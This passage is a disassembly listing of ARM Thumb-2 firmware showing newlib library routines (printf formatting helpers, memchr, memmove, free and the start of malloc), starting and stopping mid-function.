 8001c8a:	9203      	str	r2, [sp, #12]
 8001c8c:	2b00      	cmp	r3, #0
 8001c8e:	bfb8      	it	lt
 8001c90:	f04f 33ff 	movlt.w	r3, #4294967295
 8001c94:	9305      	str	r3, [sp, #20]
 8001c96:	4c2d      	ldr	r4, [pc, #180]	; (8001d4c <_svfiprintf_r+0x1d8>)
 8001c98:	2203      	movs	r2, #3
 8001c9a:	7839      	ldrb	r1, [r7, #0]
 8001c9c:	4620      	mov	r0, r4
 8001c9e:	f000 f9f5 	bl	800208c <memchr>
 8001ca2:	b138      	cbz	r0, 8001cb4 <_svfiprintf_r+0x140>
 8001ca4:	2340      	movs	r3, #64	; 0x40
 8001ca6:	1b00      	subs	r0, r0, r4
 8001ca8:	fa03 f000 	lsl.w	r0, r3, r0
 8001cac:	9b04      	ldr	r3, [sp, #16]
 8001cae:	3701      	adds	r7, #1
 8001cb0:	4303      	orrs	r3, r0
 8001cb2:	9304      	str	r3, [sp, #16]
 8001cb4:	7839      	ldrb	r1, [r7, #0]
 8001cb6:	2206      	movs	r2, #6
 8001cb8:	4825      	ldr	r0, [pc, #148]	; (8001d50 <_svfiprintf_r+0x1dc>)
 8001cba:	1c7e      	adds	r6, r7, #1
 8001cbc:	f88d 1028 	strb.w	r1, [sp, #40]	; 0x28
 8001cc0:	f000 f9e4 	bl	800208c <memchr>
 8001cc4:	2800      	cmp	r0, #0
 8001cc6:	d035      	beq.n	8001d34 <_svfiprintf_r+0x1c0>
 8001cc8:	4b22      	ldr	r3, [pc, #136]	; (8001d54 <_svfiprintf_r+0x1e0>)
 8001cca:	b9fb      	cbnz	r3, 8001d0c <_svfiprintf_r+0x198>
 8001ccc:	9b03      	ldr	r3, [sp, #12]
 8001cce:	3307      	adds	r3, #7
 8001cd0:	f023 0307 	bic.w	r3, r3, #7
 8001cd4:	3308      	adds	r3, #8
 8001cd6:	9303      	str	r3, [sp, #12]
 8001cd8:	9b09      	ldr	r3, [sp, #36]	; 0x24
 8001cda:	444b      	add	r3, r9
 8001cdc:	9309      	str	r3, [sp, #36]	; 0x24
 8001cde:	e76d      	b.n	8001bbc <_svfiprintf_r+0x48>
 8001ce0:	fb00 3202 	mla	r2, r0, r2, r3
 8001ce4:	2101      	movs	r1, #1
 8001ce6:	e7a4      	b.n	8001c32 <_svfiprintf_r+0xbe>
 8001ce8:	2300      	movs	r3, #0
 8001cea:	240a      	movs	r4, #10
 8001cec:	4618      	mov	r0, r3
 8001cee:	9305      	str	r3, [sp, #20]
 8001cf0:	460f      	mov	r7, r1
 8001cf2:	783a      	ldrb	r2, [r7, #0]
 8001cf4:	3101      	adds	r1, #1
 8001cf6:	3a30      	subs	r2, #48	; 0x30
 8001cf8:	2a09      	cmp	r2, #9
 8001cfa:	d903      	bls.n	8001d04 <_svfiprintf_r+0x190>
 8001cfc:	2b00      	cmp	r3, #0
 8001cfe:	d0ca      	beq.n	8001c96 <_svfiprintf_r+0x122>
 8001d00:	9005      	str	r0, [sp, #20]
 8001d02:	e7c8      	b.n	8001c96 <_svfiprintf_r+0x122>
 8001d04:	fb04 2000 	mla	r0, r4, r0, r2
 8001d08:	2301      	movs	r3, #1
 8001d0a:	e7f1      	b.n	8001cf0 <_svfiprintf_r+0x17c>
 8001d0c:	ab03      	add	r3, sp, #12
 8001d0e:	9300      	str	r3, [sp, #0]
 8001d10:	462a      	mov	r2, r5
 8001d12:	4b11      	ldr	r3, [pc, #68]	; (8001d58 <_svfiprintf_r+0x1e4>)
 8001d14:	a904      	add	r1, sp, #16
 8001d16:	4640      	mov	r0, r8
 8001d18:	f3af 8000 	nop.w
 8001d1c:	f1b0 3fff 	cmp.w	r0, #4294967295
 8001d20:	4681      	mov	r9, r0
 8001d22:	d1d9      	bne.n	8001cd8 <_svfiprintf_r+0x164>
 8001d24:	89ab      	ldrh	r3, [r5, #12]
 8001d26:	065b      	lsls	r3, r3, #25
 8001d28:	f53f af39 	bmi.w	8001b9e <_svfiprintf_r+0x2a>
 8001d2c:	9809      	ldr	r0, [sp, #36]	; 0x24
 8001d2e:	b01d      	add	sp, #116	; 0x74
 8001d30:	e8bd 8ff0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, fp, pc}
 8001d34:	ab03      	add	r3, sp, #12
 8001d36:	9300      	str	r3, [sp, #0]
 8001d38:	462a      	mov	r2, r5
 8001d3a:	4b07      	ldr	r3, [pc, #28]	; (8001d58 <_svfiprintf_r+0x1e4>)
 8001d3c:	a904      	add	r1, sp, #16
 8001d3e:	4640      	mov	r0, r8
 8001d40:	f000 f884 	bl	8001e4c <_printf_i>
 8001d44:	e7ea      	b.n	8001d1c <_svfiprintf_r+0x1a8>
 8001d46:	bf00      	nop
 8001d48:	0800248e 	.word	0x0800248e
 8001d4c:	08002494 	.word	0x08002494
 8001d50:	08002498 	.word	0x08002498
 8001d54:	00000000 	.word	0x00000000
 8001d58:	08001abf 	.word	0x08001abf

08001d5c <_printf_common>:
 8001d5c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8001d60:	4691      	mov	r9, r2
 8001d62:	461f      	mov	r7, r3
 8001d64:	688a      	ldr	r2, [r1, #8]
 8001d66:	690b      	ldr	r3, [r1, #16]
 8001d68:	4606      	mov	r6, r0
 8001d6a:	4293      	cmp	r3, r2
 8001d6c:	bfb8      	it	lt
 8001d6e:	4613      	movlt	r3, r2
 8001d70:	f8c9 3000 	str.w	r3, [r9]
 8001d74:	f891 2043 	ldrb.w	r2, [r1, #67]	; 0x43
 8001d78:	460c      	mov	r4, r1
 8001d7a:	f8dd 8020 	ldr.w	r8, [sp, #32]
 8001d7e:	b112      	cbz	r2, 8001d86 <_printf_common+0x2a>
 8001d80:	3301      	adds	r3, #1
 8001d82:	f8c9 3000 	str.w	r3, [r9]
 8001d86:	6823      	ldr	r3, [r4, #0]
 8001d88:	0699      	lsls	r1, r3, #26
 8001d8a:	bf42      	ittt	mi
 8001d8c:	f8d9 3000 	ldrmi.w	r3, [r9]
 8001d90:	3302      	addmi	r3, #2
 8001d92:	f8c9 3000 	strmi.w	r3, [r9]
 8001d96:	6825      	ldr	r5, [r4, #0]
 8001d98:	f015 0506 	ands.w	r5, r5, #6
 8001d9c:	d107      	bne.n	8001dae <_printf_common+0x52>
 8001d9e:	f104 0a19 	add.w	sl, r4, #25
 8001da2:	68e3      	ldr	r3, [r4, #12]
 8001da4:	f8d9 2000 	ldr.w	r2, [r9]
 8001da8:	1a9b      	subs	r3, r3, r2
 8001daa:	429d      	cmp	r5, r3
 8001dac:	db2a      	blt.n	8001e04 <_printf_common+0xa8>
 8001dae:	f894 3043 	ldrb.w	r3, [r4, #67]	; 0x43
 8001db2:	6822      	ldr	r2, [r4, #0]
 8001db4:	3300      	adds	r3, #0
 8001db6:	bf18      	it	ne
 8001db8:	2301      	movne	r3, #1
 8001dba:	0692      	lsls	r2, r2, #26
 8001dbc:	d42f      	bmi.n	8001e1e <_printf_common+0xc2>
 8001dbe:	f104 0243 	add.w	r2, r4, #67	; 0x43
 8001dc2:	4639      	mov	r1, r7
 8001dc4:	4630      	mov	r0, r6
 8001dc6:	47c0      	blx	r8
 8001dc8:	3001      	adds	r0, #1
 8001dca:	d022      	beq.n	8001e12 <_printf_common+0xb6>
 8001dcc:	6823      	ldr	r3, [r4, #0]
 8001dce:	68e5      	ldr	r5, [r4, #12]
 8001dd0:	f003 0306 	and.w	r3, r3, #6
 8001dd4:	2b04      	cmp	r3, #4
 8001dd6:	bf18      	it	ne
 8001dd8:	2500      	movne	r5, #0
 8001dda:	f8d9 2000 	ldr.w	r2, [r9]
 8001dde:	f04f 0900 	mov.w	r9, #0
 8001de2:	bf08      	it	eq
 8001de4:	1aad      	subeq	r5, r5, r2
 8001de6:	68a3      	ldr	r3, [r4, #8]
 8001de8:	6922      	ldr	r2, [r4, #16]
 8001dea:	bf08      	it	eq
 8001dec:	ea25 75e5 	biceq.w	r5, r5, r5, asr #31
 8001df0:	4293      	cmp	r3, r2
 8001df2:	bfc4      	itt	gt
 8001df4:	1a9b      	subgt	r3, r3, r2
 8001df6:	18ed      	addgt	r5, r5, r3
 8001df8:	341a      	adds	r4, #26
 8001dfa:	454d      	cmp	r5, r9
 8001dfc:	d11b      	bne.n	8001e36 <_printf_common+0xda>
 8001dfe:	2000      	movs	r0, #0
 8001e00:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 8001e04:	2301      	movs	r3, #1
 8001e06:	4652      	mov	r2, sl
 8001e08:	4639      	mov	r1, r7
 8001e0a:	4630      	mov	r0, r6
 8001e0c:	47c0      	blx	r8
 8001e0e:	3001      	adds	r0, #1
 8001e10:	d103      	bne.n	8001e1a <_printf_common+0xbe>
 8001e12:	f04f 30ff 	mov.w	r0, #4294967295
 8001e16:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 8001e1a:	3501      	adds	r5, #1
 8001e1c:	e7c1      	b.n	8001da2 <_printf_common+0x46>
 8001e1e:	2030      	movs	r0, #48	; 0x30
 8001e20:	18e1      	adds	r1, r4, r3
 8001e22:	f881 0043 	strb.w	r0, [r1, #67]	; 0x43
 8001e26:	1c5a      	adds	r2, r3, #1
 8001e28:	f894 1045 	ldrb.w	r1, [r4, #69]	; 0x45
 8001e2c:	4422      	add	r2, r4
 8001e2e:	3302      	adds	r3, #2
 8001e30:	f882 1043 	strb.w	r1, [r2, #67]	; 0x43
 8001e34:	e7c3      	b.n	8001dbe <_printf_common+0x62>
 8001e36:	2301      	movs	r3, #1
 8001e38:	4622      	mov	r2, r4
 8001e3a:	4639      	mov	r1, r7
 8001e3c:	4630      	mov	r0, r6
 8001e3e:	47c0      	blx	r8
 8001e40:	3001      	adds	r0, #1
 8001e42:	d0e6      	beq.n	8001e12 <_printf_common+0xb6>
 8001e44:	f109 0901 	add.w	r9, r9, #1
 8001e48:	e7d7      	b.n	8001dfa <_printf_common+0x9e>
	...

08001e4c <_printf_i>:
 8001e4c:	e92d 43f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, lr}
 8001e50:	4617      	mov	r7, r2
 8001e52:	7e0a      	ldrb	r2, [r1, #24]
 8001e54:	b085      	sub	sp, #20
 8001e56:	2a6e      	cmp	r2, #110	; 0x6e
 8001e58:	4698      	mov	r8, r3
 8001e5a:	4606      	mov	r6, r0
 8001e5c:	460c      	mov	r4, r1
 8001e5e:	9b0c      	ldr	r3, [sp, #48]	; 0x30
 8001e60:	f101 0e43 	add.w	lr, r1, #67	; 0x43
 8001e64:	f000 80bc 	beq.w	8001fe0 <_printf_i+0x194>
 8001e68:	d81a      	bhi.n	8001ea0 <_printf_i+0x54>
 8001e6a:	2a63      	cmp	r2, #99	; 0x63
 8001e6c:	d02e      	beq.n	8001ecc <_printf_i+0x80>
 8001e6e:	d80a      	bhi.n	8001e86 <_printf_i+0x3a>
 8001e70:	2a00      	cmp	r2, #0
 8001e72:	f000 80c8 	beq.w	8002006 <_printf_i+0x1ba>
 8001e76:	2a58      	cmp	r2, #88	; 0x58
 8001e78:	f000 808a 	beq.w	8001f90 <_printf_i+0x144>
 8001e7c:	f104 0542 	add.w	r5, r4, #66	; 0x42
 8001e80:	f884 2042 	strb.w	r2, [r4, #66]	; 0x42
 8001e84:	e02a      	b.n	8001edc <_printf_i+0x90>
 8001e86:	2a64      	cmp	r2, #100	; 0x64
 8001e88:	d001      	beq.n	8001e8e <_printf_i+0x42>
 8001e8a:	2a69      	cmp	r2, #105	; 0x69
 8001e8c:	d1f6      	bne.n	8001e7c <_printf_i+0x30>
 8001e8e:	6821      	ldr	r1, [r4, #0]
 8001e90:	681a      	ldr	r2, [r3, #0]
 8001e92:	f011 0f80 	tst.w	r1, #128	; 0x80
 8001e96:	d023      	beq.n	8001ee0 <_printf_i+0x94>
 8001e98:	1d11      	adds	r1, r2, #4
 8001e9a:	6019      	str	r1, [r3, #0]
 8001e9c:	6813      	ldr	r3, [r2, #0]
 8001e9e:	e027      	b.n	8001ef0 <_printf_i+0xa4>
 8001ea0:	2a73      	cmp	r2, #115	; 0x73
 8001ea2:	f000 80b4 	beq.w	800200e <_printf_i+0x1c2>
 8001ea6:	d808      	bhi.n	8001eba <_printf_i+0x6e>
 8001ea8:	2a6f      	cmp	r2, #111	; 0x6f
 8001eaa:	d02a      	beq.n	8001f02 <_printf_i+0xb6>
 8001eac:	2a70      	cmp	r2, #112	; 0x70
 8001eae:	d1e5      	bne.n	8001e7c <_printf_i+0x30>
 8001eb0:	680a      	ldr	r2, [r1, #0]
 8001eb2:	f042 0220 	orr.w	r2, r2, #32
 8001eb6:	600a      	str	r2, [r1, #0]
 8001eb8:	e003      	b.n	8001ec2 <_printf_i+0x76>
 8001eba:	2a75      	cmp	r2, #117	; 0x75
 8001ebc:	d021      	beq.n	8001f02 <_printf_i+0xb6>
 8001ebe:	2a78      	cmp	r2, #120	; 0x78
 8001ec0:	d1dc      	bne.n	8001e7c <_printf_i+0x30>
 8001ec2:	2278      	movs	r2, #120	; 0x78
 8001ec4:	496f      	ldr	r1, [pc, #444]	; (8002084 <_printf_i+0x238>)
 8001ec6:	f884 2045 	strb.w	r2, [r4, #69]	; 0x45
 8001eca:	e064      	b.n	8001f96 <_printf_i+0x14a>
 8001ecc:	681a      	ldr	r2, [r3, #0]
 8001ece:	f101 0542 	add.w	r5, r1, #66	; 0x42
 8001ed2:	1d11      	adds	r1, r2, #4
 8001ed4:	6019      	str	r1, [r3, #0]
 8001ed6:	6813      	ldr	r3, [r2, #0]
 8001ed8:	f884 3042 	strb.w	r3, [r4, #66]	; 0x42
 8001edc:	2301      	movs	r3, #1
 8001ede:	e0a3      	b.n	8002028 <_printf_i+0x1dc>
 8001ee0:	f011 0f40 	tst.w	r1, #64	; 0x40
 8001ee4:	f102 0104 	add.w	r1, r2, #4
 8001ee8:	6019      	str	r1, [r3, #0]
 8001eea:	d0d7      	beq.n	8001e9c <_printf_i+0x50>
 8001eec:	f9b2 3000 	ldrsh.w	r3, [r2]
 8001ef0:	2b00      	cmp	r3, #0
 8001ef2:	da03      	bge.n	8001efc <_printf_i+0xb0>
 8001ef4:	222d      	movs	r2, #45	; 0x2d
 8001ef6:	425b      	negs	r3, r3
 8001ef8:	f884 2043 	strb.w	r2, [r4, #67]	; 0x43
 8001efc:	4962      	ldr	r1, [pc, #392]	; (8002088 <_printf_i+0x23c>)
 8001efe:	220a      	movs	r2, #10
 8001f00:	e017      	b.n	8001f32 <_printf_i+0xe6>
 8001f02:	6820      	ldr	r0, [r4, #0]
 8001f04:	6819      	ldr	r1, [r3, #0]
 8001f06:	f010 0f80 	tst.w	r0, #128	; 0x80
 8001f0a:	d003      	beq.n	8001f14 <_printf_i+0xc8>
 8001f0c:	1d08      	adds	r0, r1, #4
 8001f0e:	6018      	str	r0, [r3, #0]
 8001f10:	680b      	ldr	r3, [r1, #0]
 8001f12:	e006      	b.n	8001f22 <_printf_i+0xd6>
 8001f14:	f010 0f40 	tst.w	r0, #64	; 0x40
 8001f18:	f101 0004 	add.w	r0, r1, #4
 8001f1c:	6018      	str	r0, [r3, #0]
 8001f1e:	d0f7      	beq.n	8001f10 <_printf_i+0xc4>
 8001f20:	880b      	ldrh	r3, [r1, #0]
 8001f22:	2a6f      	cmp	r2, #111	; 0x6f
 8001f24:	bf14      	ite	ne
 8001f26:	220a      	movne	r2, #10
 8001f28:	2208      	moveq	r2, #8
 8001f2a:	4957      	ldr	r1, [pc, #348]	; (8002088 <_printf_i+0x23c>)
 8001f2c:	2000      	movs	r0, #0
 8001f2e:	f884 0043 	strb.w	r0, [r4, #67]	; 0x43
 8001f32:	6865      	ldr	r5, [r4, #4]
 8001f34:	2d00      	cmp	r5, #0
 8001f36:	60a5      	str	r5, [r4, #8]
 8001f38:	f2c0 809c 	blt.w	8002074 <_printf_i+0x228>
 8001f3c:	6820      	ldr	r0, [r4, #0]
 8001f3e:	f020 0004 	bic.w	r0, r0, #4
 8001f42:	6020      	str	r0, [r4, #0]
 8001f44:	2b00      	cmp	r3, #0
 8001f46:	d13f      	bne.n	8001fc8 <_printf_i+0x17c>
 8001f48:	2d00      	cmp	r5, #0
 8001f4a:	f040 8095 	bne.w	8002078 <_printf_i+0x22c>
 8001f4e:	4675      	mov	r5, lr
 8001f50:	2a08      	cmp	r2, #8
 8001f52:	d10b      	bne.n	8001f6c <_printf_i+0x120>
 8001f54:	6823      	ldr	r3, [r4, #0]
 8001f56:	07da      	lsls	r2, r3, #31
 8001f58:	d508      	bpl.n	8001f6c <_printf_i+0x120>
 8001f5a:	6923      	ldr	r3, [r4, #16]
 8001f5c:	6862      	ldr	r2, [r4, #4]
 8001f5e:	429a      	cmp	r2, r3
 8001f60:	bfde      	ittt	le
 8001f62:	2330      	movle	r3, #48	; 0x30
 8001f64:	f805 3c01 	strble.w	r3, [r5, #-1]
 8001f68:	f105 35ff 	addle.w	r5, r5, #4294967295
 8001f6c:	ebae 0305 	sub.w	r3, lr, r5
 8001f70:	6123      	str	r3, [r4, #16]
 8001f72:	f8cd 8000 	str.w	r8, [sp]
 8001f76:	463b      	mov	r3, r7
 8001f78:	aa03      	add	r2, sp, #12
 8001f7a:	4621      	mov	r1, r4
 8001f7c:	4630      	mov	r0, r6
 8001f7e:	f7ff feed 	bl	8001d5c <_printf_common>
 8001f82:	3001      	adds	r0, #1
 8001f84:	d155      	bne.n	8002032 <_printf_i+0x1e6>
 8001f86:	f04f 30ff 	mov.w	r0, #4294967295
 8001f8a:	b005      	add	sp, #20
 8001f8c:	e8bd 83f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, pc}
 8001f90:	f881 2045 	strb.w	r2, [r1, #69]	; 0x45
 8001f94:	493c      	ldr	r1, [pc, #240]	; (8002088 <_printf_i+0x23c>)
 8001f96:	6822      	ldr	r2, [r4, #0]
 8001f98:	6818      	ldr	r0, [r3, #0]
 8001f9a:	f012 0f80 	tst.w	r2, #128	; 0x80
 8001f9e:	f100 0504 	add.w	r5, r0, #4
 8001fa2:	601d      	str	r5, [r3, #0]
 8001fa4:	d001      	beq.n	8001faa <_printf_i+0x15e>
 8001fa6:	6803      	ldr	r3, [r0, #0]
 8001fa8:	e002      	b.n	8001fb0 <_printf_i+0x164>
 8001faa:	0655      	lsls	r5, r2, #25
 8001fac:	d5fb      	bpl.n	8001fa6 <_printf_i+0x15a>
 8001fae:	8803      	ldrh	r3, [r0, #0]
 8001fb0:	07d0      	lsls	r0, r2, #31
 8001fb2:	bf44      	itt	mi
 8001fb4:	f042 0220 	orrmi.w	r2, r2, #32
 8001fb8:	6022      	strmi	r2, [r4, #0]
 8001fba:	b91b      	cbnz	r3, 8001fc4 <_printf_i+0x178>
 8001fbc:	6822      	ldr	r2, [r4, #0]
 8001fbe:	f022 0220 	bic.w	r2, r2, #32
 8001fc2:	6022      	str	r2, [r4, #0]
 8001fc4:	2210      	movs	r2, #16
 8001fc6:	e7b1      	b.n	8001f2c <_printf_i+0xe0>
 8001fc8:	4675      	mov	r5, lr
 8001fca:	fbb3 f0f2 	udiv	r0, r3, r2
 8001fce:	fb02 3310 	mls	r3, r2, r0, r3
 8001fd2:	5ccb      	ldrb	r3, [r1, r3]
 8001fd4:	f805 3d01 	strb.w	r3, [r5, #-1]!
 8001fd8:	4603      	mov	r3, r0
 8001fda:	2800      	cmp	r0, #0
 8001fdc:	d1f5      	bne.n	8001fca <_printf_i+0x17e>
 8001fde:	e7b7      	b.n	8001f50 <_printf_i+0x104>
 8001fe0:	6808      	ldr	r0, [r1, #0]
 8001fe2:	681a      	ldr	r2, [r3, #0]
 8001fe4:	f010 0f80 	tst.w	r0, #128	; 0x80
 8001fe8:	6949      	ldr	r1, [r1, #20]
 8001fea:	d004      	beq.n	8001ff6 <_printf_i+0x1aa>
 8001fec:	1d10      	adds	r0, r2, #4
 8001fee:	6018      	str	r0, [r3, #0]
 8001ff0:	6813      	ldr	r3, [r2, #0]
 8001ff2:	6019      	str	r1, [r3, #0]
 8001ff4:	e007      	b.n	8002006 <_printf_i+0x1ba>
 8001ff6:	f010 0f40 	tst.w	r0, #64	; 0x40
 8001ffa:	f102 0004 	add.w	r0, r2, #4
 8001ffe:	6018      	str	r0, [r3, #0]
 8002000:	6813      	ldr	r3, [r2, #0]
 8002002:	d0f6      	beq.n	8001ff2 <_printf_i+0x1a6>
 8002004:	8019      	strh	r1, [r3, #0]
 8002006:	2300      	movs	r3, #0
 8002008:	4675      	mov	r5, lr
 800200a:	6123      	str	r3, [r4, #16]
 800200c:	e7b1      	b.n	8001f72 <_printf_i+0x126>
 800200e:	681a      	ldr	r2, [r3, #0]
 8002010:	1d11      	adds	r1, r2, #4
 8002012:	6019      	str	r1, [r3, #0]
 8002014:	6815      	ldr	r5, [r2, #0]
 8002016:	2100      	movs	r1, #0
 8002018:	6862      	ldr	r2, [r4, #4]
 800201a:	4628      	mov	r0, r5
 800201c:	f000 f836 	bl	800208c <memchr>
 8002020:	b108      	cbz	r0, 8002026 <_printf_i+0x1da>
 8002022:	1b40      	subs	r0, r0, r5
 8002024:	6060      	str	r0, [r4, #4]
 8002026:	6863      	ldr	r3, [r4, #4]
 8002028:	6123      	str	r3, [r4, #16]
 800202a:	2300      	movs	r3, #0
 800202c:	f884 3043 	strb.w	r3, [r4, #67]	; 0x43
 8002030:	e79f      	b.n	8001f72 <_printf_i+0x126>
 8002032:	6923      	ldr	r3, [r4, #16]
 8002034:	462a      	mov	r2, r5
 8002036:	4639      	mov	r1, r7
 8002038:	4630      	mov	r0, r6
 800203a:	47c0      	blx	r8
 800203c:	3001      	adds	r0, #1
 800203e:	d0a2      	beq.n	8001f86 <_printf_i+0x13a>
 8002040:	6823      	ldr	r3, [r4, #0]
 8002042:	079b      	lsls	r3, r3, #30
 8002044:	d507      	bpl.n	8002056 <_printf_i+0x20a>
 8002046:	2500      	movs	r5, #0
 8002048:	f104 0919 	add.w	r9, r4, #25
 800204c:	68e3      	ldr	r3, [r4, #12]
 800204e:	9a03      	ldr	r2, [sp, #12]
 8002050:	1a9b      	subs	r3, r3, r2
 8002052:	429d      	cmp	r5, r3
 8002054:	db05      	blt.n	8002062 <_printf_i+0x216>
 8002056:	68e0      	ldr	r0, [r4, #12]
 8002058:	9b03      	ldr	r3, [sp, #12]
 800205a:	4298      	cmp	r0, r3
 800205c:	bfb8      	it	lt
 800205e:	4618      	movlt	r0, r3
 8002060:	e793      	b.n	8001f8a <_printf_i+0x13e>
 8002062:	2301      	movs	r3, #1
 8002064:	464a      	mov	r2, r9
 8002066:	4639      	mov	r1, r7
 8002068:	4630      	mov	r0, r6
 800206a:	47c0      	blx	r8
 800206c:	3001      	adds	r0, #1
 800206e:	d08a      	beq.n	8001f86 <_printf_i+0x13a>
 8002070:	3501      	adds	r5, #1
 8002072:	e7eb      	b.n	800204c <_printf_i+0x200>
 8002074:	2b00      	cmp	r3, #0
 8002076:	d1a7      	bne.n	8001fc8 <_printf_i+0x17c>
 8002078:	780b      	ldrb	r3, [r1, #0]
 800207a:	f104 0542 	add.w	r5, r4, #66	; 0x42
 800207e:	f884 3042 	strb.w	r3, [r4, #66]	; 0x42
 8002082:	e765      	b.n	8001f50 <_printf_i+0x104>
 8002084:	080024b0 	.word	0x080024b0
 8002088:	0800249f 	.word	0x0800249f

0800208c <memchr>:
 800208c:	b510      	push	{r4, lr}
 800208e:	b2c9      	uxtb	r1, r1
 8002090:	4402      	add	r2, r0
 8002092:	4290      	cmp	r0, r2
 8002094:	4603      	mov	r3, r0
 8002096:	d101      	bne.n	800209c <memchr+0x10>
 8002098:	2000      	movs	r0, #0
 800209a:	bd10      	pop	{r4, pc}
 800209c:	781c      	ldrb	r4, [r3, #0]
 800209e:	3001      	adds	r0, #1
 80020a0:	428c      	cmp	r4, r1
 80020a2:	d1f6      	bne.n	8002092 <memchr+0x6>
 80020a4:	4618      	mov	r0, r3
 80020a6:	bd10      	pop	{r4, pc}

080020a8 <memmove>:
 80020a8:	4288      	cmp	r0, r1
 80020aa:	b510      	push	{r4, lr}
 80020ac:	eb01 0302 	add.w	r3, r1, r2
 80020b0:	d803      	bhi.n	80020ba <memmove+0x12>
 80020b2:	1e42      	subs	r2, r0, #1
 80020b4:	4299      	cmp	r1, r3
 80020b6:	d10c      	bne.n	80020d2 <memmove+0x2a>
 80020b8:	bd10      	pop	{r4, pc}
 80020ba:	4298      	cmp	r0, r3
 80020bc:	d2f9      	bcs.n	80020b2 <memmove+0xa>
 80020be:	1881      	adds	r1, r0, r2
 80020c0:	1ad2      	subs	r2, r2, r3
 80020c2:	42d3      	cmn	r3, r2
 80020c4:	d100      	bne.n	80020c8 <memmove+0x20>
 80020c6:	bd10      	pop	{r4, pc}
 80020c8:	f813 4d01 	ldrb.w	r4, [r3, #-1]!
 80020cc:	f801 4d01 	strb.w	r4, [r1, #-1]!
 80020d0:	e7f7      	b.n	80020c2 <memmove+0x1a>
 80020d2:	f811 4b01 	ldrb.w	r4, [r1], #1
 80020d6:	f802 4f01 	strb.w	r4, [r2, #1]!
 80020da:	e7eb      	b.n	80020b4 <memmove+0xc>

080020dc <_free_r>:
 80020dc:	b538      	push	{r3, r4, r5, lr}
 80020de:	4605      	mov	r5, r0
 80020e0:	2900      	cmp	r1, #0
 80020e2:	d043      	beq.n	800216c <_free_r+0x90>
 80020e4:	f851 3c04 	ldr.w	r3, [r1, #-4]
 80020e8:	1f0c      	subs	r4, r1, #4
 80020ea:	2b00      	cmp	r3, #0
 80020ec:	bfb8      	it	lt
 80020ee:	18e4      	addlt	r4, r4, r3
 80020f0:	f000 f8d4 	bl	800229c <__malloc_lock>
 80020f4:	4a1e      	ldr	r2, [pc, #120]	; (8002170 <_free_r+0x94>)
 80020f6:	6813      	ldr	r3, [r2, #0]
 80020f8:	4610      	mov	r0, r2
 80020fa:	b933      	cbnz	r3, 800210a <_free_r+0x2e>
 80020fc:	6063      	str	r3, [r4, #4]
 80020fe:	6014      	str	r4, [r2, #0]
 8002100:	4628      	mov	r0, r5
 8002102:	e8bd 4038 	ldmia.w	sp!, {r3, r4, r5, lr}
 8002106:	f000 b8ca 	b.w	800229e <__malloc_unlock>
 800210a:	42a3      	cmp	r3, r4
 800210c:	d90b      	bls.n	8002126 <_free_r+0x4a>
 800210e:	6821      	ldr	r1, [r4, #0]
 8002110:	1862      	adds	r2, r4, r1
 8002112:	4293      	cmp	r3, r2
 8002114:	bf01      	itttt	eq
 8002116:	681a      	ldreq	r2, [r3, #0]
 8002118:	685b      	ldreq	r3, [r3, #4]
 800211a:	1852      	addeq	r2, r2, r1
 800211c:	6022      	streq	r2, [r4, #0]
 800211e:	6063      	str	r3, [r4, #4]
 8002120:	6004      	str	r4, [r0, #0]
 8002122:	e7ed      	b.n	8002100 <_free_r+0x24>
 8002124:	4613      	mov	r3, r2
 8002126:	685a      	ldr	r2, [r3, #4]
 8002128:	b10a      	cbz	r2, 800212e <_free_r+0x52>
 800212a:	42a2      	cmp	r2, r4
 800212c:	d9fa      	bls.n	8002124 <_free_r+0x48>
 800212e:	6819      	ldr	r1, [r3, #0]
 8002130:	1858      	adds	r0, r3, r1
 8002132:	42a0      	cmp	r0, r4
 8002134:	d10b      	bne.n	800214e <_free_r+0x72>
 8002136:	6820      	ldr	r0, [r4, #0]
 8002138:	4401      	add	r1, r0
 800213a:	1858      	adds	r0, r3, r1
 800213c:	4282      	cmp	r2, r0
 800213e:	6019      	str	r1, [r3, #0]
 8002140:	d1de      	bne.n	8002100 <_free_r+0x24>
 8002142:	6810      	ldr	r0, [r2, #0]
 8002144:	6852      	ldr	r2, [r2, #4]
 8002146:	4401      	add	r1, r0
 8002148:	6019      	str	r1, [r3, #0]
 800214a:	605a      	str	r2, [r3, #4]
 800214c:	e7d8      	b.n	8002100 <_free_r+0x24>
 800214e:	d902      	bls.n	8002156 <_free_r+0x7a>
 8002150:	230c      	movs	r3, #12
 8002152:	602b      	str	r3, [r5, #0]
 8002154:	e7d4      	b.n	8002100 <_free_r+0x24>
 8002156:	6820      	ldr	r0, [r4, #0]
 8002158:	1821      	adds	r1, r4, r0
 800215a:	428a      	cmp	r2, r1
 800215c:	bf01      	itttt	eq
 800215e:	6811      	ldreq	r1, [r2, #0]
 8002160:	6852      	ldreq	r2, [r2, #4]
 8002162:	1809      	addeq	r1, r1, r0
 8002164:	6021      	streq	r1, [r4, #0]
 8002166:	6062      	str	r2, [r4, #4]
 8002168:	605c      	str	r4, [r3, #4]
 800216a:	e7c9      	b.n	8002100 <_free_r+0x24>
 800216c:	bd38      	pop	{r3, r4, r5, pc}
 800216e:	bf00      	nop
 8002170:	200018f4 	.word	0x200018f4

08002174 <_malloc_r>:
 8002174:	b570      	push	{r4, r5, r6, lr}
 8002176:	1ccd      	adds	r5, r1, #3
 8002178:	f025 0503 	bic.w	r5, r5, #3
 800217c:	3508      	adds	r5, #8
 800217e:	2d0c      	cmp	r5, #12
 8002180:	bf38      	it	cc
 8002182:	250c      	movcc	r5, #12
 8002184:	2d00      	cmp	r5, #0
 8002186:	4606      	mov	r6, r0
 8002188:	db01      	blt.n	800218e <_malloc_r+0x1a>
 800218a:	42a9      	cmp	r1, r5
 800218c:	d903      	bls.n	8002196 <_malloc_r+0x22>
 800218e:	230c      	movs	r3, #12
 8002190:	6033      	str	r3, [r6, #0]
 8002192:	2000      	movs	r0, #0
 8002194:	bd70      	pop	{r4, r5, r6, pc}
 8002196:	f000 f881 	bl	800229c <__malloc_lock>
 800219a:	4a23      	ldr	r2, [pc, #140]	; (8002228 <_malloc_r+0xb4>)
 800219c:	6814      	ldr	r4, [r2, #0]
 800219e:	4621      	mov	r1, r4
